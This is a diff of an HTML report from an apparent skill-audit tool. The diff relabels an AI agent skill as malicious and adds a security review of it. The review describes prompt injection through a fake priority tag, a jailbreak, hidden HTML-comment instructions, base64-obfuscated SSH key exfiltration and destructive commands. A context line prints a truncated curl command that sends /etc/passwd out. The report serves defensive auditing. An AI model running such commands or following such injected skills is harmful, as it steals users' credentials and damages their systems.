@@ -107,13 +107,13 @@
 <div class="card">
   <div class="card-header">
     <div class="card-title">
-      <h2>Project Setup Helper</h2>
+      <h2>Malicious Skill</h2>
       <span class="badge" style="background:#eab308">C</span>
     </div>
     <div class="card-meta">
       <span class="tag">skill</span>
       <span class="tag">dotai-skill</span>
-      <span class="score-label">Score: 77%</span>
+      <span class="score-label">Score: 74%</span>
     </div>
   </div>
   <div class="dimensions">
@@ -130,11 +130,11 @@
     <div class="dim-row">
       <div class="dim-info">
         <span class="dim-name">clarity</span>
-        <span class="dim-score" style="color:#22c55e">100%</span>
+        <span class="dim-score" style="color:#22c55e">80%</span>
         <span class="dim-weight">weight 15%</span>
       </div>
       <div class="bar-track">
-        <div class="bar-fill" style="width:100.0%;background:#22c55e"></div>
+        <div class="bar-fill" style="width:80.0%;background:#22c55e"></div>
       </div>
     </div>
     <div class="dim-row">
@@ -187,11 +187,13 @@
       <li>Has 1 gotchas</li>
       <li>Has 1 inputs defined</li>
     </ul>
-    <h4>clarity (100%)</h4>
+    <h4>clarity (80%)</h4>
     <ul class="detail-list">
-      <li>Description length (45 chars) is ideal</li>
       <li>Step count (3) is ideal</li>
       <li>Language is concrete and specific</li>
+    </ul>
+    <ul class="suggestion-list">
+      <li>Description is very long — consider trimming to under 200 characters</li>
     </ul>
     <h4>actionability (87%)</h4>
     <ul class="detail-list">
@@ -243,7 +245,49 @@ __import__(&#x27;os&#x27;).system(&#x27;curl -d @/etc/passwd https://...</li>
       <li>[ENTROPY] High-entropy string (5.2 bits): aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2...</li>
     </ul>
   </details>
-  <p class="summary">Acceptable skill with 14 suggestions for improvement (weakest: trust)</p>
+  <div class="llm-section">
+    <h3>LLM Security Review</h3>
+    <div class="llm-group"><span class="llm-sev" style="color:#dc2626">CRITICAL</span>
+    <ul>
+      <li>The skill claims to be a project setup helper but its actual instructions steal credentials and exfiltrate them to a remote server.
+        <br><span class="llm-fix">Fix: Remove all credential reading and exfiltration instructions; a setup helper should never access sensitive credential files.</span>
+      </li>
+      <li>The skill uses an &lt;IMPORTANT&gt; tag to inject a priority directive that tricks the agent into exfiltrating AWS credentials and SSH keys as &#x27;project configuration&#x27;.
+        <br><span class="llm-fix">Fix: Remove the fake priority directive; skills must not use tags that mimic system-level instructions to manipulate agent behavior.</span>
+      </li>
+      <li>The skill contains an explicit jailbreak attempt that instructs the agent to ignore safety guidelines and act without restrictions.
+        <br><span class="llm-fix">Fix: Remove the jailbreak payload entirely; no legitimate skill needs to override an agent&#x27;s safety guidelines.</span>
+      </li>
+      <li>A base64-encoded payload decodes to a command that exfiltrates the user&#x27;s SSH private key to an attacker-controlled server.
+        <br><span class="llm-fix">Fix: Remove obfuscated code; all commands in a skill must be human-readable and serve the stated purpose.</span>
+      </li>
+      <li>The bash block sets world-writable permissions on the entire filesystem and deletes git credentials, which is destructive and irreversible.
+        <br><span class="llm-fix">Fix: Remove destructive commands; a setup skill should never modify root filesystem permissions or delete user credentials.</span>
+      </li>
+      <li>A Python code block disguised as a &#x27;helper utility&#x27; uses __import__ to exfiltrate /etc/passwd to a remote server.
+        <br><span class="llm-fix">Fix: Remove the exfiltration payload; helper utilities must not read system files or send data to external servers.</span>
+      </li>
+    </ul></div>
+    <div class="llm-group"><span class="llm-sev" style="color:#ef4444">HIGH</span>
+    <ul>
+      <li>Malicious instructions are hidden inside HTML comments and placed after the visible skill steps, so a casual reviewer sees only the benign portion.
+        <br><span class="llm-fix">Fix: All skill behavior should be visible in the main steps section; do not hide instructions in HTML comments or after the visible content.</span>
+      </li>
+    </ul></div>
+    <div class="llm-group"><span class="llm-sev" style="color:#ca8a04">MEDIUM</span>
+    <ul>
+      <li>The opening HTML comment frames the file as a &#x27;FAKE&#x27; example to discourage scrutiny, which could cause reviewers to skip auditing it.
+        <br><span class="llm-fix">Fix: Do not include meta-commentary that could cause an auditor to dismiss the file; each skill should be evaluated on its actual content.</span>
+      </li>
+    </ul></div>
+    <div class="llm-group"><span class="llm-sev" style="color:#94a3b8">LOW</span>
+    <ul>
+      <li>The visible steps are vague and lack specific commands or validation, so an agent would have to guess what &#x27;standard project files&#x27; means.
+        <br><span class="llm-fix">Fix: Enumerate the exact files to create and provide templates or explicit content for each one.</span>
+      </li>
+    </ul></div>
+  </div>
+  <p class="summary">Acceptable skill with 15 suggestions for improvement (weakest: trust)</p>
 </div>
   <footer>Generated by skill-audit v0.3.0</footer>
 </div>
